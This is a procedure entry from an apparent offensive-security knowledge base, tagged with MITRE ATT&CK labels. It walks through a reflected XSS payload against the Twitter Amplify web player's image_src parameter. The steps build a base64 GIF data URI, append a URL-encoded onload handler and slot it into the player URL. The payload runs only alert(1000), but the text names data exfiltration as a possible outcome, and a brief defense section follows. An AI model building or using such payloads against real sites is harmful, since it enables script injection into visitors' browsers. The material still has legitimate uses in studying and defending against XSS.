---
id: proc-uuid-15125-step2
tags:
  - xss
  - payload-crafting
  - data-uri
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:36.053Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft XSS Payload for image_src

## Summary

This procedure crafts a reflected XSS payload using a data URI to inject JavaScript into the image_src parameter of the Twitter Amplify web player, bypassing basic sanitization by exploiting direct attribute insertion.

## Description

Based on the vulnerability where image_src is unsafely placed in an img src attribute, encode a JavaScript onload handler within a base64 data URI. This allows arbitrary code execution upon image load in browsers without CSP enforcement. The attack scenario involves URL construction for the player endpoint, targeting older browsers like Android versions lacking full CSP support, with outcomes including alert execution or data exfiltration.

## Requirements

1. Knowledge of URL encoding and data URIs
2. Target endpoint URL
3. Text editor for payload construction

## Defense

Defensive measures and detection strategies:

- Validate and whitelist image_src to only allow http/https URLs, rejecting data: schemes
- Escape HTML attributes using libraries like DOMPurify
- Monitor for anomalous query parameters in web logs

## Objectives

1. Create an injectable payload via data URI
2. Ensure compatibility with vulnerable environments
3. Enable JS execution like alerts for proof-of-concept

## Instructions

### Step 1: Encode the Base Image

**Context**: Start with a minimal GIF base64 to form a valid data URI.

Use: data:image/gif;base64,R0lGODlhAQABAIAAAAAAAAAAACH5BAAAAAAALAAAAAABAAEAAAICTAEAOw

> This provides a harmless image placeholder.

### Step 2: Append onload JavaScript

**Context**: Inject the onload handler to execute code.

Append URL-encoded: %27onload%3D%27alert(1000)

Full payload: data:image/gif;base64,R0lGODlhAQABAIAAAAAAAAAAACH5BAAAAAAALAAAAAABAAEAAAICTAEAOw%27onload%3D%27alert(1000)

> Decodes to 'onload=alert(1000)' after injection.

### Step 3: Construct Full URL

**Context**: Integrate into the player endpoint.

URL: https://amp.twimg.com/amplify-web-player/prod/source.html?url=...&image_src=[payload]

> Replace ... with a valid video URL if needed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[JavaScript]]
